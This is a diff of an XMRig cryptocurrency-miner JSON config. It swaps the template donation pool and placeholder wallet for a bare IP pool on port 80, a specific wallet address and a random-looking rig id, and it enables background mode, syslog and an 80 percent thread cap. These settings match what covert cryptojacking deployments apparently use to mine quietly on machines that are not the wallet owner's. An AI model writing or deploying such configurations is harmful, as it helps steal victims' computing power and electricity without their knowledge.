@@ -11,33 +11,32 @@
         "restricted": true
     },
     "autosave": true,
-    "background": false,
+    "background": true,
     "colors": true,
     "title": true,
     "randomx": {
         "init": -1,
-        "init-avx2": -1,
         "mode": "auto",
         "1gb-pages": false,
         "rdmsr": true,
         "wrmsr": true,
         "cache_qos": false,
-        "numa": true,
-        "scratchpad_prefetch_mode": 1
+        "numa": true
     },
     "cpu": {
         "enabled": true,
         "huge-pages": true,
-        "huge-pages-jit": false,
         "hw-aes": null,
         "priority": null,
         "memory-pool": false,
         "yield": true,
-        "max-threads-hint": 100,
+        "max-threads-hint": 80,
         "asm": true,
         "argon2-impl": null,
+        "astrobwt-max-size": 550,
         "cn/0": false,
-        "cn-lite/0": false
+        "cn-lite/0": false,
+        "kawpow": false
     },
     "opencl": {
         "enabled": false,
@@ -60,29 +59,27 @@
     "log-file": null,
     "pools": [
         {
-            "algo": null,
+            "algo": "rx/0",
             "coin": null,
-            "url": "donate.v2.xmrig.com:3333",
-            "user": "YOUR_WALLET_ADDRESS",
+            "url": "149.50.222.86:80",
+            "user": "ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ",
             "pass": "x",
-            "rig-id": null,
+            "rig-id": "nkixxoc103",
             "nicehash": false,
-            "keepalive": false,
+            "keepalive": true,
             "enabled": true,
             "tls": false,
             "tls-fingerprint": null,
             "daemon": false,
             "socks5": null,
-            "self-select": null,
-            "submit-to-origin": false
+            "self-select": null
         }
     ],
     "print-time": 60,
     "health-print-time": 60,
-    "dmi": true,
     "retries": 5,
     "retry-pause": 5,
-    "syslog": false,
+    "syslog": true,
     "tls": {
         "enabled": false,
         "protocols": null,
@@ -92,13 +89,7 @@
         "ciphersuites": null,
         "dhparam": null
     },
-    "dns": {
-        "ipv6": false,
-        "ttl": 30
-    },
     "user-agent": null,
     "verbose": 0,
-    "watch": true,
-    "pause-on-battery": false,
-    "pause-on-active": false
+    "watch": true
 }
